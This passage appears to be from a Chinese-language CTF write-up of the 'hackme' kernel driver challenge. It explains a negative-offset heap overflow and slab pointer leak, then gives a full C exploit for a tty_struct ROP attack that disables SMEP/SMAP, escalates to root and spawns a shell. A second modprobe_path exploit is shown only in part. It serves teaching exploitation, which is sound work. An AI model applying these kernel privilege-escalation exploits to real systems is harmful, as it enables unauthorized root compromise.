class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ( cmd == <span class="number">0x30003</span> )                  <span class="comment">// HACK_READ</span></span><br><span class="line">&#123;</span><br><span class="line">  index = userdata.index;</span><br><span class="line">  kheap_ptr = pool[index].ptr;</span><br><span class="line">  kheap = &amp;pool[index];</span><br><span class="line">  <span class="keyword">if</span> ( kheap_ptr )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( userdata.offset + userdata.size &lt;= kheap-&gt;size )</span><br><span class="line">    &#123;</span><br><span class="line">      copy_to_user(userdata.data, &amp;kheap_ptr[userdata.offset], userdata.size);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li><code>userdata.offset</code> 是符号数，并且没有限制其必须为正数</li>
<li>令 <code>userdata.offset</code> 为负数就可以在 <code>kheap_ptr[userdata.offset]</code> 中向上溢出</li>
</ul>
<p><strong>入侵思路 - Tty_struct Attack</strong></p>
<p><code>tty_struct attack</code> 可以用于泄露 kernel_base，如果想用它来提权，则需要泄露 heap_addr</p>
<p>本题目的溢出可以轻松泄露空闲块的 next 指针，然后泄露出 heap_addr</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">kcreate(<span class="number">2</span>,buf,<span class="number">0x100</span>);</span><br><span class="line">kcreate(<span class="number">3</span>,buf,<span class="number">0x100</span>);</span><br><span class="line">kfree(<span class="number">2</span>);</span><br><span class="line">kread(<span class="number">3</span>,buf,<span class="number">0x100</span>,<span class="number">-0x100</span>);</span><br><span class="line"><span class="keyword">size_t</span> heap_addr = ((<span class="keyword">size_t</span> *)buf)[<span class="number">0</span>] - <span class="number">0x200</span>;</span><br></pre></td></tr></table></figure>
<ul>
<li>释放 “内存块2” 后，通过 “内存块3” 向上泄露内存快2的 next 指针</li>
<li>这源自于 slab 的一个机制：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">20</span>xg <span class="number">0xffffa1f380179400</span></span><br><span class="line"><span class="number">0xffffa1f380179400</span>:	<span class="number">0xffffa1f380179600</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0xffffa1f380179410</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0xffffa1f380179420</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0xffffa1f380179430</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0xffffa1f380179440</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line">pwndbg&gt; x/<span class="number">20</span>xg <span class="number">0xffffa1f380179600</span></span><br><span class="line"><span class="number">0xffffa1f380179600</span>:	<span class="number">0xffffa1f380179700</span>	<span class="number">0xdf84653679b215c3</span></span><br><span class="line"><span class="number">0xffffa1f380179610</span>:	<span class="number">0xc7e58d27141d6541</span>	<span class="number">0x875eeb6934a2d05d</span></span><br><span class="line"><span class="number">0xffffa1f380179620</span>:	<span class="number">0x32e830be7c767f6e</span>	<span class="number">0xc8103477ca4944c2</span></span><br><span class="line"><span class="number">0xffffa1f380179630</span>:	<span class="number">0x88364f1e93ef79cc</span>	<span class="number">0x2ba3fb91bbc17dd4</span></span><br><span class="line"><span class="number">0xffffa1f380179640</span>:	<span class="number">0x4ae5ec2914d5d54d</span>	<span class="number">0xa34247ff14fc9404</span></span><br><span class="line">pwndbg&gt; x/<span class="number">20</span>xg <span class="number">0xffffa1f380179700</span></span><br><span class="line"><span class="number">0xffffa1f380179700</span>:	<span class="number">0xffffa1f380179800</span>	<span class="number">0x2d87f67ef5f84679</span></span><br><span class="line"><span class="number">0xffffa1f380179710</span>:	<span class="number">0x224428f2894924d4</span>	<span class="number">0x8c097463e73b5f8f</span></span><br><span class="line"><span class="number">0xffffa1f380179720</span>:	<span class="number">0x51e6f451fc6c7d48</span>	<span class="number">0xf7f1f1c979b53b2c</span></span><br><span class="line"><span class="number">0xffffa1f380179730</span>:	<span class="number">0xe4bddcf6395344b1</span>	<span class="number">0x66766646ae4ea583</span>  </span><br></pre></td></tr></table></figure>
<ul>
<li>空闲块都会有一个 next 指针，用于指向下一个内存块</li>
<li>Slab 将内核中经常使用的对象放到高速缓存中，并且由系统保持为初始的可利用状态，因此上图中的 <code>0x400</code> <code>0x600</code> <code>0x700</code> 都是 free 状态</li>
</ul>
<p>由于系统开启了 smap，内核需要使用 <code>copy_from_user</code> 才能访问用户态数据，于是我们利用 <code>kcreate</code> 把 <code>fake_tty_operations</code> 指针和 <code>rop</code> 指针保存到内核的堆里： </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kcreate(<span class="number">2</span>,(<span class="keyword">char</span> *)rop,<span class="number">0x100</span>);</span><br><span class="line">kcreate(<span class="number">3</span>,(<span class="keyword">char</span> *)fake_tty_operations,<span class="number">0x100</span>);</span><br></pre></td></tr></table></figure>
<p>对于 <code>tty_struct attack</code>，还需要一个关键的 gadget，其目的是为了栈迁移（把 RAX 中的数据转移到 RSP 中）：</p>
<ul>
<li>最直接的 gadget 就是 <code>mov rax, rsp</code></li>
<li>如果没有就以其他寄存器为中介</li>
<li>如果还是没有就只能用 <code>push rax + pop rsp</code></li>
</ul>
<p>剩下的操作就比较套路化了，可以当做是 <code>tty_struct attack</code> 的模板，注意控制一下 CR4 寄存器就好</p>
<p>完整 exp：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> RAW_KERNEL_BASE 0XFFFFFFFF81000000</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HACK_FREE 0x30001</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HACK_WRITE 0x30002</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HACK_READ 0x30003</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HACK_CREATE 0x30000</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> MOV_CR4_RAX = <span class="number">0xffffffff8100252b</span> - RAW_KERNEL_BASE; <span class="comment">// mov cr4, rax ; push rcx ; popfq ; pop rbp ; ret</span></span><br><span class="line"><span class="keyword">size_t</span> SWAPGS = <span class="number">0xffffffff81200c2e</span> - RAW_KERNEL_BASE; <span class="comment">// swapgs ; popfq ; pop rbp ; ret</span></span><br><span class="line"><span class="keyword">size_t</span> IRETQ = <span class="number">0xFFFFFFFF81019356</span> - RAW_KERNEL_BASE; <span class="comment">// iretq; pop rbp; ret;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> COMMIT_CREDS = <span class="number">0xFFFFFFFF8104D220</span> - RAW_KERNEL_BASE;</span><br><span class="line"><span class="keyword">size_t</span> PREPARE_KERNEL_CRED = <span class="number">0xFFFFFFFF8104D3D0</span> - RAW_KERNEL_BASE;</span><br><span class="line"></span><br><span class="line"><span class="comment">//size_t PUSH_RAX_POP_RSP = 0xffffffff810608d5 - RAW_KERNEL_BASE; // push rax; pop rsp; ret;</span></span><br><span class="line"><span class="keyword">size_t</span> PUSH_RAX_POP_RSP = <span class="number">0xffffffff8116b3c5</span> - RAW_KERNEL_BASE; <span class="comment">// push rax; sub byte ptr [rbx + 0x41], bl; pop rsp; pop rbp; ret; </span></span><br><span class="line"><span class="keyword">size_t</span> POP_RAX = <span class="number">0xffffffff8101b5a1</span> - RAW_KERNEL_BASE; <span class="comment">// pop rax; ret; </span></span><br><span class="line"><span class="keyword">size_t</span> POP_RSP = <span class="number">0xffffffff810484f0</span> - RAW_KERNEL_BASE; <span class="comment">// pop rsp; ret; </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> fd;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">initFD</span><span class="params">()</span> </span>&#123;</span><br><span class="line">   fd = open(<span class="string">&quot;/dev/hackme&quot;</span>,<span class="number">0</span>);</span><br><span class="line">   <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;open file error!!\n&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Item</span>&#123;</span></span><br><span class="line">   <span class="keyword">int</span> index; </span><br><span class="line">   <span class="keyword">char</span> *buf; </span><br><span class="line">   <span class="keyword">int64_t</span> size; </span><br><span class="line">   <span class="keyword">int64_t</span> offset; </span><br><span class="line">&#125;item;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">kcreate</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> index,<span class="keyword">char</span> *buf,<span class="keyword">int64_t</span> size)</span> </span>&#123;</span><br><span class="line">   item data;</span><br><span class="line">   data.index = index;</span><br><span class="line">   data.buf = buf;</span><br><span class="line">   data.size = size;</span><br><span class="line">   data.offset = <span class="number">0</span>;</span><br><span class="line">   ioctl(fd,HACK_CREATE,&amp;data);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">kfree</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> index)</span> </span>&#123;</span><br><span class="line">   item data;</span><br><span class="line">   data.index = index;</span><br><span class="line">   ioctl(fd,HACK_FREE,&amp;data);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">kwrite</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> index,<span class="keyword">char</span> *buf,<span class="keyword">int64_t</span> size,<span class="keyword">int64_t</span> offset)</span></span>&#123;</span><br><span class="line">   item data;</span><br><span class="line">   data.index = index;</span><br><span class="line">   data.buf = buf;</span><br><span class="line">   data.size = size;</span><br><span class="line">   data.offset = offset;</span><br><span class="line">   ioctl(fd,HACK_WRITE,&amp;data);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">kread</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> index,<span class="keyword">char</span> *buf,<span class="keyword">int64_t</span> size,<span class="keyword">int64_t</span> offset)</span> </span>&#123;</span><br><span class="line">   item data;</span><br><span class="line">   data.index = index;</span><br><span class="line">   data.buf = buf;</span><br><span class="line">   data.size = size;</span><br><span class="line">   data.offset = offset;</span><br><span class="line">   ioctl(fd,HACK_READ,&amp;data);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">0x1000</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init_addr</span><span class="params">(<span class="keyword">size_t</span> kernel_base)</span> </span>&#123;</span><br><span class="line">   MOV_CR4_RAX += kernel_base;</span><br><span class="line">   SWAPGS += kernel_base;</span><br><span class="line">   IRETQ += kernel_base;</span><br><span class="line">   COMMIT_CREDS += kernel_base;</span><br><span class="line">   PREPARE_KERNEL_CRED += kernel_base;</span><br><span class="line">   PUSH_RAX_POP_RSP += kernel_base;</span><br><span class="line">   POP_RSP += kernel_base;</span><br><span class="line">   POP_RAX += kernel_base;</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;PUSH_RAX_POP_RSP=0x%lx\n&quot;</span>,PUSH_RAX_POP_RSP);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getRoot</span><span class="params">()</span> </span>&#123;</span><br><span class="line">   <span class="keyword">void</span> *(*pkc)(<span class="keyword">int</span>) = (<span class="keyword">void</span> *(*)(<span class="keyword">int</span>))PREPARE_KERNEL_CRED;</span><br><span class="line">   <span class="keyword">void</span> (*cc)(<span class="keyword">void</span> *) = (<span class="keyword">void</span> (*)(<span class="keyword">void</span> *))COMMIT_CREDS;</span><br><span class="line">   (*cc)((*pkc)(<span class="number">0</span>)); <span class="comment">// commit_creds(prepare_kernel_cred(0))</span></span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getShell</span><span class="params">()</span> </span>&#123;</span><br><span class="line">   <span class="keyword">if</span> (getuid() == <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;root&quot;</span>);</span><br><span class="line">      system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;root wrong&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> user_cs,user_ss,user_flags,user_sp;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_status</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_flags;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;saved&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">   <span class="built_in">puts</span>(<span class="string">&quot;start&quot;</span>);</span><br><span class="line">   save_status();</span><br><span class="line">   initFD();</span><br><span class="line">   kcreate(<span class="number">0</span>,buf,<span class="number">0x2E0</span>);</span><br><span class="line">   kcreate(<span class="number">1</span>,buf,<span class="number">0x2E0</span>);</span><br><span class="line">   kfree(<span class="number">0</span>);</span><br><span class="line">   kcreate(<span class="number">2</span>,buf,<span class="number">0x100</span>);</span><br><span class="line">   kcreate(<span class="number">3</span>,buf,<span class="number">0x100</span>);</span><br><span class="line">   kfree(<span class="number">2</span>);</span><br><span class="line">   kread(<span class="number">3</span>,buf,<span class="number">0x100</span>,<span class="number">-0x100</span>);</span><br><span class="line">   <span class="keyword">size_t</span> heap_addr = ((<span class="keyword">size_t</span> *)buf)[<span class="number">0</span>] - <span class="number">0x200</span>;</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;heap_addr=0x%lx\n&quot;</span>,heap_addr);</span><br><span class="line">   <span class="keyword">size_t</span> fake_tty_operations[<span class="number">0x20</span>];</span><br><span class="line">   <span class="keyword">int</span> tty_fd = open(<span class="string">&quot;/dev/ptmx&quot;</span>,O_RDWR);</span><br><span class="line">   kread(<span class="number">1</span>,buf,<span class="number">0x400</span>,<span class="number">-0x400</span>);</span><br><span class="line">   <span class="keyword">size_t</span> kernel_base = ((<span class="keyword">size_t</span> *)buf)[<span class="number">3</span>] - <span class="number">0x625D80</span>;</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;kernel_base=0x%lx\n&quot;</span>,kernel_base);</span><br><span class="line">   init_addr(kernel_base);</span><br><span class="line">   <span class="comment">//sleep(10);</span></span><br><span class="line"></span><br><span class="line">   <span class="keyword">size_t</span> rop[<span class="number">0x20</span>];</span><br><span class="line">   <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">   rop[i++] = POP_RAX;</span><br><span class="line">   rop[i++] = <span class="number">0x6f0</span>;</span><br><span class="line">   rop[i++] = MOV_CR4_RAX;</span><br><span class="line">   rop[i++] = <span class="number">0</span>;</span><br><span class="line">   rop[i++] = (<span class="keyword">size_t</span>)getRoot;</span><br><span class="line">   rop[i++] = SWAPGS;</span><br><span class="line">   rop[i++] = <span class="number">0</span>;</span><br><span class="line">   rop[i++] = <span class="number">0</span>;</span><br><span class="line">   rop[i++] = IRETQ;</span><br><span class="line">   rop[i++] = (<span class="keyword">size_t</span>)getShell;</span><br><span class="line">   rop[i++] = user_cs;</span><br><span class="line">   rop[i++] = user_flags;</span><br><span class="line">   rop[i++] = user_sp;</span><br><span class="line">   rop[i++] = user_ss;</span><br><span class="line"></span><br><span class="line">   kcreate(<span class="number">2</span>,(<span class="keyword">char</span> *)rop,<span class="number">0x100</span>);</span><br><span class="line">   <span class="keyword">size_t</span> rop_addr = heap_addr;</span><br><span class="line"> </span><br><span class="line">   fake_tty_operations[<span class="number">7</span>] = PUSH_RAX_POP_RSP;</span><br><span class="line">   fake_tty_operations[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">   fake_tty_operations[<span class="number">1</span>] = POP_RSP;</span><br><span class="line">   fake_tty_operations[<span class="number">2</span>] = rop_addr;</span><br><span class="line"></span><br><span class="line">   kfree(<span class="number">3</span>);</span><br><span class="line">   kcreate(<span class="number">3</span>,(<span class="keyword">char</span> *)fake_tty_operations,<span class="number">0x100</span>);</span><br><span class="line">   <span class="keyword">size_t</span> fake_tty_operations_addr = heap_addr + <span class="number">0x100</span>;</span><br><span class="line">   ((<span class="keyword">size_t</span> *)buf)[<span class="number">3</span>] = fake_tty_operations_addr;</span><br><span class="line">   kwrite(<span class="number">1</span>,buf,<span class="number">0x400</span>,<span class="number">-0x400</span>); </span><br><span class="line">   write(tty_fd,buf,<span class="number">0x10</span>);</span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>ha1vk 大佬的 exp 中有个 gadget 我找不到，于是我找了另一个来替代它（我先把所有包含 <code>pop rsp</code> 的 gadget 重定位到一个文件中，然后再这个文件中搜索 <code>push rax</code>）</li>
</ul>
<p><strong>入侵思路 - Modprobe_path Attack</strong></p>
<p><code>modprobe_path</code> 是用于在 <code>Linux</code> 内核中添加可加载的内核模块，当我们在 <code>Linux</code> 内核中安装或卸载新模块时，就会执行 <code>modprobe_path</code> 指向的程序</p>
<p>因此我们需要劫持 <code>modprobe_path</code>，劫持的方法就是利用 Slab 空闲块的 next 指针</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/home/pwn <span class="meta"># cat /proc/kallsyms | grep modprobe_path</span></span><br><span class="line">ffffffff8483f960 D modprobe_path</span><br><span class="line">/home/pwn <span class="meta"># cat /proc/kallsyms | grep startup_64</span></span><br><span class="line">ffffffff84000000 T startup_64</span><br></pre></td></tr></table></figure>
<ul>
<li>这里可以计算出 <code>modprobe_path</code> 的偏移</li>
</ul>
<p>如果通过劫持 next 指针实现 WAA，就需要注意一个细节：</p>
<ul>
<li>通过 fake next 指针申请的内存块是不合法的，并且会破坏 Slab 原本的次序</li>
<li>这会导致在后续的 <code>system</code> 中出现错误（因为 <code>system</code> 也会利用 Slab 来分配内存）</li>
<li>因此，我们在执行 <code>system</code> 前需要先 <code>kfree</code> 一些内存块，使 <code>system</code> 优先申请这些合法的内存块，从而避免报错</li>
</ul>
<p>完整 exp：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HACK_FREE 0x30001</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HACK_WRITE 0x30002</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HACK_READ 0x30003</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HACK_CREATE 